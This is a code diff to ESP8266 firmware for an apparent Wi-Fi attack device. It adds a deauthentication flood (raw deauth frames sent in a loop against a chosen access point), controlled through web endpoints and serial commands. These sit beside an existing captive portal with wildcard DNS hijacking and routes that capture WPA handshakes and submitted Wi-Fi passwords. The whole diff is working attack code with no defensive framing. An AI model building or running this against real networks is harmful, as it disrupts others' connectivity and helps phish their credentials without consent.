@@ -2,6 +2,7 @@
 #include <DNSServer.h>
 #include <ArduinoJson.h>
 #include <LittleFS.h>
+#include <WebSocketsServer.h>
 
 #include "utils.h"
 #include "wifi.h"
@@ -13,7 +14,44 @@ IPAddress APIP(172, 0, 0, 1);
 const byte DNS_PORT = 53;
 DNSServer dnsServer;
 ESP8266WebServer server(80);
+WebSocketsServer webSocket = WebSocketsServer(81);
+AccessPoint accessPoints[20];
+AccessPoint selectedAP;
+int AP_COUNT = 0;
+int DEAUTH = 0;
 
+void deauth(AccessPoint ap){
+  for(int i =0; i< 100; i++){
+      wifi_set_channel(ap.channel);
+      delay(1);
+      wifi_send_pkt_freedom(ap.deauthPacket, 26, 0);
+      delay(1);
+  }
+}
+
+void webSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length) {
+  if(length == 0) return;
+  switch(type) {
+    case WStype_DISCONNECTED:
+      Serial.printf("[%u] Disconnected!\r ", num);
+      break;
+    case WStype_CONNECTED: {
+        IPAddress ip = webSocket.remoteIP(num);
+        Serial.printf("[%u] Connection from ", num);
+        Serial.println(ip.toString());
+        Serial.printf("url: %s\r, ", payload);
+        webSocket.broadcastTXT("New client connected");
+      }
+      break;
+    case WStype_TEXT:
+      if(strcmp((char*)payload,"ping") == 0){
+        webSocket.sendTXT(num, "pong");
+      }
+      break;  
+    default:
+      break;  
+  }
+}
 
 void setup()
 {
@@ -27,26 +65,49 @@ void setup()
   initialServerSetup(APIP);
   dnsServer.start(DNS_PORT, "*", APIP);
 
-  server.on("/", [](){handleRequest(server, "/index.html.gz","html");});
-  server.on("/handshake", [](){handleRequest(server, "/handshake.html.gz","html");});
-  server.on("/ssid", [](){handleRequest(server, "/ssid.html.gz","html");});
-  server.on("/final", [](){handleRequest(server, "/final.html.gz","html");});
-
-  server.on("/jquery.min.js", [](){handleRequest(server,"/jquery.min.js.gz","js");});
-  server.on("/bootstrap.min.js", [](){handleRequest(server,"/bootstrap.min.js.gz","js");});
-  server.on("/capfile.js", [](){handleRequest(server,"/capfile.js.gz","js");});
-  server.on("/crypto.js", [](){handleRequest(server,"/crypto.js.gz","js");}); 
-
+  server.on("/", [](){handleRequest(server, "/index.html","html");});
+  server.on("/attack", [](){handleRequest(server, "/index.html","html");});
+  server.on("/css/index.css", [](){handleRequest(server,"/index.css.gz","css");}); 
+  server.on("/js/index.js", [](){handleRequest(server,"/index.js.gz","js");});
+  server.on("/js/capfile.js", [](){handleRequest(server,"/capfile.js.gz","js");});
+  server.on("/png/router.png",[](){handleRequest(server,"/router.png","png");});
+  
   server.on("/post_ssid", [](){String ssid = server.arg("ssid");changeWifi(ssid);});
   server.on("/post_handshake",[]() {handlePostHandshake(server);});
   server.on("/post_password",[]() {handlePostPassword(server); BLINK(5); });
+  server.on("/get_ssid",[](){server.send(200, "application/json", getSSID());});
   server.on("/get_datas",[]() {server.send(200, "application/json", getDatas());});
+  server.on("/get_networks",[](){AP_COUNT = scan_networks(accessPoints); available_networks(server,accessPoints,AP_COUNT,DEAUTH,selectedAP);});
   server.on("/clear_handshakes",[]() {server.send(200, "application/json", clearHandshakes());});
   server.on("/clear_passwords",[]() {server.send(200, "application/json", clearPasswords());});
+
+  server.on("/deauth",[](){
+    int n = server.arg("ap").toInt(); 
+    if(n > 0 && n <= AP_COUNT){
+      if(DEAUTH == 1){
+        server.send(200, "application/json", "{\"message\":\"Already Deauthenticating - "+selectedAP.ssid+"\",\"status\":\"error\"}");
+        return;
+      }
+      DEAUTH = 1;
+      selectedAP = accessPoints[n-1];
+      selectedAP.deauthState = 1;
+      server.send(200, "application/json", "{\"message\":\"Deauthenticating "+selectedAP.ssid+"\",\"status\":\"success\"}");
+    }
+    else{
+      server.send(200, "application/json", "{\"message\":\"Invalid Access Point number\",\"status\":\"error\"}");
+    }
+  });
+  server.on("/stop_deauth",[](){
+    DEAUTH = 0;
+    selectedAP.deauthState=0; 
+    server.send(200, "application/json", "{\"message\":\"Stopped Deauthenticating "+selectedAP.ssid+"\"}");
+    });
 
   server.onNotFound([](){handleNotFound(server);});
 
   server.begin();
+  webSocket.begin();
+  webSocket.onEvent(webSocketEvent);
   pinMode(BUILTIN_LED, OUTPUT);
   digitalWrite(BUILTIN_LED, HIGH);
 }
@@ -99,13 +160,46 @@ void loop()
       Serial.println("Calculating Space...");
       storageInfo();  
     }
-
+    else if (strcmp(buffer,"scan") == 0){
+      Serial.println("Scanning for Wi-Fi networks...");
+      AP_COUNT = scan_networks(accessPoints);
+    }
+    else if (strcmp(buffer,"list networks") == 0){
+      Serial.println("Listing Wi-Fi networks...");
+      list_network_details(accessPoints,AP_COUNT);
+    }
+    else if (strncmp(buffer,"deauth",6) == 0){
+      int n = atoi(buffer + 7);  
+      if(n > 0 && n <= AP_COUNT){
+        if(DEAUTH == 1){
+          Serial.println("Already Deauthenticating - "+selectedAP.ssid);
+          return;
+        }
+        DEAUTH = 1;
+        selectedAP = accessPoints[n-1];
+        Serial.println("Starting deauth...");
+      }
+      else{
+        Serial.println("Invalid Access Point number");
+        Serial.println("Type list networks to see available networks");
+      }
+    }
+    else if (strcmp(buffer,"stop deauth") == 0){
+      Serial.println("Stopping deauth...");
+      DEAUTH = 0;
+    }
     else {
       Serial.println("Invalid command");
       Serial.println("Type help to see available commands");
     }
     Serial.println("");
   }
+  if(DEAUTH){
+    Serial.println("Deauthenticating.. "+selectedAP.ssid);
+    deauth(selectedAP);
+    delay(500);
+  }
   dnsServer.processNextRequest();
+  webSocket.loop();
   server.handleClient();
 }
